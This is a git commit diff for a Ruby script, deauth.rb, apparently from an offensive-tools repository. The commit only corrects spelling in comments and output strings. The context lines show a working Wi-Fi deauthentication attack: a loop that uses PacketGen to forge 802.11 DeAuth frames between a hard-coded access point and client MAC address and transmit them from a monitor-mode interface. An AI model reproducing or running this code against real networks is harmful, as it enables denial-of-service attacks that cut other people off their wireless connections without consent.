d60432812677b99f9c9a20a798979c15d32f3631
usr2r00t <usr2r00t@protonmail.com>
2021-11-23 19:47:02 +0100

    Update deauth.rb

--- deauth.rb
+++ deauth.rb
@@ -9,15 +9,15 @@ def main
     packnum = "100000000000000"
     iface, bssid, client = [
     'mon0',               # Interface - monitoring mode
-    '2C:AB:00:A9:6C:64',  # Acesss Point
+    '2C:AB:00:A9:6C:64',  # Acess Point
     'C0:EE:FB:33:E2:09'   # Destination 
     ]
     while true
         pkt = PacketGen.gen('RadioTap').
                         add('Dot11::Management', mac1: client, mac2: bssid, mac3: bssid).
                         add('Dot11::DeAuth', reason: 7)
-        puts "Sedning Defualt Amount  -> " + packnum 
-        puts "[+] Sending Deauth Using --> " + iface + ' to Acess Point --> ' + bssid + 'Too Client --> ' + client 
+        puts "Sending Default Amount  -> " + packnum 
+        puts "[+] Sending Deauth Using --> " + iface + ' to Acess Point --> ' + bssid + 'To Client --> ' + client 
         pkt.to_w(iface, calc: true, number: 100000000000000, interval: 0.2)
     end
 end
